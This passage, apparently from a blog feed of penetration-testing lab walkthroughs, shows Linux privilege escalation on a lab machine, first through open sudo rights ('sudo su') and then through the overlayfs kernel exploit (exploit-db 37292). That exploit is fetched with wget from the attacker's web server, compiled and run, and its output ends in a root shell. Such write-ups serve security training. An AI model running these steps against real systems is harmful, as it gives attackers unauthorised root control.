+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ ssh yousef@192.168.120.65yousef@192.168.120.65&#x27;s password:Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic i686) * Documentation:  https://help.ubuntu.com/yousef@yousef-VirtualBox:~$ iduid=1000(yousef) gid=1000(yousef) groups=1000(yousef),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br></pre></td></tr></table></figure>
+
+<p>Let’s check what this user is able to run with sudo.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yousef@yousef-VirtualBox:~$ sudo -l[sudo] password for yousef:Matching Defaults entries for yousef on yousef-VirtualBox:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser yousef may run the following commands on yousef-VirtualBox:    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
+
+<p>We find that the user <code>yousef</code> has wide-open sudo permissions. We can easily take advantage of this and spawn a root shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yousef@yousef-VirtualBox:~$ whoamiyousefyousef@yousef-VirtualBox:~$ sudo suroot@yousef-VirtualBox:/home/yousef# whoamiroot</span><br></pre></td></tr></table></figure>
+
+<h3 id="Escalation-via-Kernel-Exploit"><a href="#Escalation-via-Kernel-Exploit" class="headerlink" title="Escalation via Kernel Exploit"></a><strong>Escalation via Kernel Exploit</strong></h3><p>Given the age of this operating system kernel version, there are several exploits available for it. We will opt for the <a href="https://www.exploit-db.com/exploits/37292">overlayfs Local Privilege Escalation</a> exploit.</p>
+<p>Having downloaded the exploit source code to our attacking machine, we’ll start a python web server to host it.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br></pre></td></tr></table></figure>
+
+<p>On the target machine, we’ll navigate to the <strong>/tmp</strong> directory and download the exploit code.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd /tmp</span><br><span class="line">$ wget http://192.168.118.5/37292.c</span><br><span class="line">--2021-04-02 18:02:18--  http://192.168.118.5/37292.c</span><br><span class="line">Connecting to 192.168.118.5:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3861 (3.8K) [text/x-csrc]</span><br><span class="line">Saving to: &#x27;37292.c&#x27;</span><br><span class="line"></span><br><span class="line">     0K ...                                                   100%  292M=0s</span><br><span class="line"></span><br><span class="line">2021-04-02 18:02:18 (292 MB/s) - &#x27;37292.c&#x27; saved [3861/3861]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Next, we’ll compile it with <code>gcc</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc 37292.c -o exploit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Finally, we’ll launch the compiled exploit (executable permissions are already granted by <code>gcc</code>) and drop into a root shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ ./exploit</span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line">sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Linux Walkthrough</category>
+      </categories>
+      <tags>
+        <tag>Enumeration</tag>
+        <tag>User Credentials</tag>
+        <tag>Kernel Exploit</tag>
       </tags>
   </entry>
   <entry>
